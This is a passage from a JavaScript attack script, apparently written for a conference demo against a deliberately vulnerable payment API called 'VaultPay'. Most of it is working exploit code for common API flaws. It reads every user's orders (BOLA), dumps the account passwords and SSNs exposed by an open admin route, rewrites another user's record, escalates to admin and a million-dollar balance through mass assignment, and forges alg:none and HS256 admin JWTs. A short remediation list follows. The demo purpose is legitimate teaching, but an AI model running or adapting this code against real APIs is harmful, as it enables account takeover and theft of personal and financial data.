            bad(`Got ${stolen.orders.length} orders spanning ${1 + others.size} users (BOLA)`);
            for (const o of stolen.orders.slice(0, 8)) {
                loot(`Order #${o.id}`, `userId=${o.userId} ${o.merchant} $${o.amount} ····${o.cardLast4}`);
            }
            record(
                "CRITICAL",
                "BOLA on /api/orders",
                "Authn present, authz missing — any login reads every order",
                { kind: "app-code", owasp: "API1" }
            );
        } else if (loginOk.user.role === "admin") {
            info("Admin fallback cannot establish unauthorized cross-user order access; no BOLA finding counted");
        } else {
            ok(`Orders scoped to self (${stolen.orders.length} order(s) for user #${loginOk.user.id})`);
        }
    }

    const escToken = stolen.token;
    const escId = loginOk.user.id;

    if (loginOk.user.role !== "admin") {
        narrate("Hit /api/admin/stats before escalation with a non-admin identity...");
        const stats = await http("GET", "/api/admin/stats", {
            headers: { Authorization: `Bearer ${escToken}` },
            label: "admin-stats",
        });
        if (stats.status === 200 && Array.isArray(stats.json?.accounts) && stats.json.accounts.length > 0) {
            bad(`Admin dashboard open to a non-admin identity - ${stats.json.accounts.length} accounts`);
            for (const account of stats.json.accounts.slice(0, 6)) {
                loot(account.email, `password=${account.password} ssn=${account.ssn}`);
            }
            record(
                "CRITICAL",
                "Admin route accessible to a non-admin identity",
                "Observed before role mutation: a regular user's token accesses the administrative account dump (BFLA).",
                { kind: "app-code", owasp: "API5" }
            );
        } else {
            info(`Non-admin access probe returned ${stats.status}; BFLA not confirmed`);
        }
    } else {
        info("Login fallback is already admin; skip non-admin BFLA and privilege-escalation claims");
    }

    const victimId = escId === 2 ? 1 : 2;
    const victimName = victimId === 2 ? "Bob" : "Alice";
    narrate(`Cross-user write: ${loginOk.email}'s token edits seed user #${victimId} (${victimName})…`);
    const hijack = await http("PUT", `/api/users/${victimId}`, {
        headers: { Authorization: `Bearer ${escToken}` },
        body: {
            internalNote: "cleared by attacker via cross-user PUT",
            name: `Hijacked ${victimName}`,
        },
        label: "cross-user-write",
    });
    if (loginOk.user.role !== "admin" && hijack.status === 200 &&
        hijack.json?.user?.id === victimId && hijack.json.user.name === `Hijacked ${victimName}`) {
        bad(`Rewrote user #${victimId} without ownership check`);
        loot("victim", JSON.stringify(hijack.json.user));
        record(
            "CRITICAL",
            "Cross-user write without ownership check",
            "Before escalation, a regular user's token edited a different seed user's record without an ownership check.",
            { kind: "app-code", owasp: "API1" }
        );
    } else {
        info(`Cross-user write → ${hijack.status}`);
    }

    narrate(`Mass-assign role=admin and balance on seed user #${escId} (${loginOk.email})...`);
    const escalate = await http("PUT", `/api/users/${escId}`, {
        headers: { Authorization: `Bearer ${escToken}` },
        body: { role: "admin", balance: 1_000_000, internalNote: "pwned by attack.mjs" },
        label: "mass-assign-admin",
    });
    if (loginOk.user.role !== "admin" && escalate.status === 200 && escalate.json?.user?.id === escId &&
        escalate.json.user.role === "admin" && escalate.json.user.balance === 1_000_000) {
        stolen.escalated = loginOk.user.role !== "admin";
        bad(`User #${escId} has role=admin and balance=${escalate.json.user.balance}`);
        loot("new-role", escalate.json.user.role);
        loot("new-balance", String(escalate.json.user.balance));
        record(
            "CRITICAL",
            "Mass assignment privilege escalation",
            "No field allowlist on PUT body - app merged raw JSON into the user",
            { kind: "app-code", owasp: "API3" }
        );
    } else {
        info(`Mass assignment → ${escalate.status}`);
    }

    narrate('Trying the classic "alg": "none" unsigned-token forgery…');
    const noneToken = `${b64url(JSON.stringify({ alg: "none", typ: "JWT" }))}.${b64url(
        JSON.stringify({ sub: 3, email: "admin@vaultpay.demo", role: "admin", name: "None Admin" })
    )}.`;
    const noneRes = await http("GET", "/api/me", {
        headers: { Authorization: `Bearer ${noneToken}` },
        label: "jwt-alg-none",
    });
    if (noneRes.status === 200 && noneRes.json?.user?.id === 3) {
        bad("Server accepted an UNSIGNED alg:none token");
        record(
            "CRITICAL",
            "Unsigned JWT (alg:none) accepted",
            "Verification did not pin an algorithm allowlist",
            { kind: "app-code", owasp: "API2" }
        );
    } else if (noneRes.status === 401) {
        ok(
            `alg:none rejected (${noneRes.status}) — jsonwebtoken v9 pins HS256/384/512 for string secrets, not the app`
        );
        info("You did not configure this. A library maintainer did. That is the whole talk.");
    } else {
        info(`Unsigned-token probe inconclusive (${noneRes.status}); signature rejection not confirmed`);
    }

    if (stolen.jwtSecret) {
        narrate(`Forging HS256 admin JWT with leaked secret "${stolen.jwtSecret}"…`);
        const admin =
            stolen.users.find((u) => u.role === "admin") || {
                id: 3,
                email: "admin@vaultpay.demo",
            };
        const forged = signHs256(
            {
                sub: admin.id,
                email: admin.email,
                role: "admin",
                name: "Forged Admin",
                iat: Math.floor(Date.now() / 1000),
                exp: Math.floor(Date.now() / 1000) + 86400,
            },
            stolen.jwtSecret
        );
        loot("forged-jwt", forged);
        const me = await http("GET", "/api/me", {
            headers: { Authorization: `Bearer ${forged}` },
            label: "forged-admin-me",
        });
        if (me.status === 200 && me.json?.user?.id === admin.id && me.json.user.role === "admin") {
            stolen.forgedAdminToken = forged;
            bad("Server accepted a fully attacker-forged admin JWT");
            loot("forged-identity", JSON.stringify(me.json?.user));
            record(
                "CRITICAL",
                "Forged JWTs accepted (weak/leaked secret)",
                "A forged token returned the intended admin identity. Signature verification is expected to accept correctly signed tokens; disclosure/weakness of the key is the authentication compromise.",
                { kind: "app-code", owasp: "API2" }
            );
        } else {
            info(`Forged admin identity not confirmed (${me.status}); generated token is not counted as accepted`);
        }
    } else {
        info("No JWT secret recovered — skip forgery");
    }
}

function printRemediation() {
    console.log(`
${c.bold}${c.green}╔══════════════════════════════════════════════════════════════════════╗
║                     REMEDIATION (quick fix map)                      ║
╚══════════════════════════════════════════════════════════════════════╝${c.reset}
`);
    console.log(`  ${c.red}${c.bold}(app-code)${c.reset}  — fix in your handlers (framework will not invent these)
    · Ownership (BOLA/IDOR): order.userId === req.user.sub — on every read AND write
    · Roles (BFLA): requireRole("admin") — login alone is not enough
    · Request field allowlist — never merge raw JSON into user/role
    · Response field allowlist — pick what you return; no ssn/cardNumber leaving endpoints
    · Path jail on any file path from user input
    · SSRF: allowlist egress hosts; reject link-local/metadata (169.254.169.254)
    · Authn ≠ authz: a valid JWT is not an access-control policy\n`);

    console.log(`  ${c.blue}${c.bold}(framework-gap)${c.reset} — Express does not ship these; you must add them
    · Rate limit / login throttle (e.g. express-rate-limit)\n`);
}

function printReport() {
    const bySev = stolen.findings.reduce((m, f) => {
        m[f.severity] = (m[f.severity] || 0) + 1;
        return m;
    }, {});
    const byKind = stolen.findings.reduce((m, f) => {
        const k = f.kind || "app-code";
        m[k] = (m[k] || 0) + 1;
        return m;
    }, {});
    const criticals = bySev.CRITICAL || 0;
    const owaspHits = [
        ...new Set(stolen.findings.map((f) => f.owasp).filter(Boolean)),
    ].sort();

    console.log(`
${c.bold}${c.red}╔══════════════════════════════════════════════════════════════════════╗
║                        ENGAGEMENT REPORT                             ║
╚══════════════════════════════════════════════════════════════════════╝${c.reset}
`);
    const elapsedSec = ((Date.now() - startedAt) / 1000).toFixed(1);
    console.log(`  ${c.bold}Target${c.reset}          ${BASE}`);
    console.log(`  ${c.bold}HTTP requests${c.reset}   ${reqSeq}`);
    console.log(`  ${c.bold}Elapsed${c.reset}         ${elapsedSec}s`);
    console.log(`  ${c.bold}Finding records${c.reset} ${stolen.findings.length}`);
    console.log(`  ${c.bold}By severity${c.reset}     ${JSON.stringify(bySev)}`);
    console.log(`  ${c.bold}By kind${c.reset}         ${JSON.stringify(byKind)}`);
    console.log(
        `  ${c.bold}OWASP API 2023${c.reset}   ${owaspHits.length ? owaspHits.join(", ") : "—"}`
    );
    console.log(`  ${c.bold}Users stolen${c.reset}     ${stolen.users.length}`);
    console.log(`  ${c.bold}Orders stolen${c.reset}    ${stolen.orders.length}`);
    console.log(
        `  ${c.bold}JWT secret${c.reset}       ${stolen.jwtSecret ? c.red + "YES — " + stolen.jwtSecret + c.reset : "no"}`
    );
    console.log(`  ${c.bold}Privilege esc${c.reset}    ${stolen.escalated ? c.red + "YES" + c.reset : "no"}`);
    console.log(
        `  ${c.bold}Forged admin${c.reset}     ${stolen.forgedAdminToken ? c.red + "YES" + c.reset : "no"}`
    );

    console.log(`\n  ${c.bold}All findings:${c.reset}`);
    for (const f of stolen.findings) {
        finding(f.severity, f.title, f);
        if (f.detail) info(f.detail);
    }

    if (stolen.platformNotes.length) {
        console.log(`\n  ${c.bold}${c.yellow}Platform notes (edge blocked probe — app may still be open):${c.reset}`);
        for (const n of stolen.platformNotes) {
            console.log(`    ${c.yellow}◇${c.reset} ${n.title}`);
            if (n.detail) info(n.detail);
        }
    }

    if (criticals > 0) {
        console.log(
            `\n${c.bgRed}${c.white}${c.bold}  DEMO RESULT: API PWNED — ${criticals} critical findings · ${reqSeq} requests · ${elapsedSec}s  ${c.reset}\n`
        );
    } else {
        console.log(
            `\n${c.bgGreen}${c.white}${c.bold}  DEMO RESULT: 0 critical · ${reqSeq} requests · ${elapsedSec}s  ${c.reset}\n`
        );
    }

    printRemediation();

    if (asJson) {
        console.log(
            JSON.stringify(
                {
                    target: BASE,
                    owaspEdition: 2023,
                    severityScheme: "demo-author-rated",
                    requests: reqSeq,
                    elapsedSeconds: Number(elapsedSec),
                    findings: stolen.findings,
                    platformNotes: stolen.platformNotes,
                    usersStolen: stolen.users.length,
                    ordersStolen: stolen.orders.length,
                    jwtSecret: Boolean(stolen.jwtSecret),
                    escalated: stolen.escalated,
                    forgedAdmin: Boolean(stolen.forgedAdminToken),
                },
                null,
                2
            )
        );
    }
}

/**
 * Orchestrator — Call order for the 5 selected high-impact phases:
 *   1. phaseReset (if --reset)
 *   2. phaseUnauthDataTheft (Phase 12)
 *   3. phasePathTraversal   (Phase 07)
 *   4. phaseSsrfProxy       (Phase 09)
 *   5. phaseNoRateLimitFlood(Phase 06)
 *   6. phaseAuthzAndForgery (Phase 16)
 *   —— printReport
 */
async function main() {
    banner();
    await phaseReset();
    await dramaPause();
    await phaseUnauthDataTheft();
    await dramaPause();
    await phasePathTraversal();
    await dramaPause();
    await phaseSsrfProxy();
    await dramaPause();
    await phaseNoRateLimitFlood();
    await dramaPause();
    await phaseAuthzAndForgery();
    printReport();
}

main().catch((err) => {
    console.error(err);
    process.exit(1);
});
